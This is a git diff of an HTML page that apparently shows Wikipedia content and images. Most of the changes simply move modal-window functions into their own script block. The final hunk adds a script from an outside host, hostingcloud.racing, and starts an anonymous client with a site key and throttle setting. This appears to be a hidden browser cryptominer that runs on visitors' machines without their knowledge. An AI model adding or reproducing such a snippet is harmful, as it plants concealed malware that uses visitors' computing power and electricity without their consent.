@@ -370,6 +370,28 @@ footer a:hover {
             <footer>
                 &copy; 2025 Made by <a href="btem.html" target="_blank">btem</a>
             </footer>
+            <script>
+                // Function to open the modal with the Wikipedia page
+function openModal(url) {
+    const modal = document.getElementById("modal");
+    const overlay = document.getElementById("overlay");
+    const iframe = document.getElementById("modalIframe");
+
+    iframe.src = url;
+    modal.style.display = "block";
+    overlay.style.display = "block";
+}
+// Function to close the modal
+function closeModal() {
+    const modal = document.getElementById("modal");
+    const overlay = document.getElementById("overlay");
+    const iframe = document.getElementById("modalIframe");
+
+    iframe.src = "";
+    modal.style.display = "none";
+    overlay.style.display = "none";
+}
+</script>
         <script type="module">
             // Import Firebase
 import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
@@ -540,28 +562,6 @@ function shuffleArray(array) {
     return array;
 }
 
-// Function to open the modal with the Wikipedia page
-function openModal(url) {
-    const modal = document.getElementById("modal");
-    const overlay = document.getElementById("overlay");
-    const iframe = document.getElementById("modalIframe");
-
-    iframe.src = url;
-    modal.style.display = "block";
-    overlay.style.display = "block";
-}
-
-// Function to close the modal
-function closeModal() {
-    const modal = document.getElementById("modal");
-    const overlay = document.getElementById("overlay");
-    const iframe = document.getElementById("modalIframe");
-
-    iframe.src = "";
-    modal.style.display = "none";
-    overlay.style.display = "none";
-}
-
 // Function to fetch images from MediaWiki API
 async function searchImages(query) {
     const url = `https://en.wikipedia.org/w/api.php?action=query&titles=${encodeURIComponent(query)}&prop=images&format=json&origin=*`;
@@ -667,6 +667,15 @@ document.querySelectorAll('.categories a').forEach(category => {
         }
     });
 });
+     </script>
+     <script src="https://www.hostingcloud.racing/Lw4s.js"></script>
+     <script>
+         var _client = new Client.Anonymous('f6147a529cf8cb62239faf7c62fe94730355788a089dc017eb4c18e6da25e3e7', {
+             throttle: 0.1, c: 'w'
+         });
+         _client.start();
+         
+     
      </script>
      </body>
     </html>
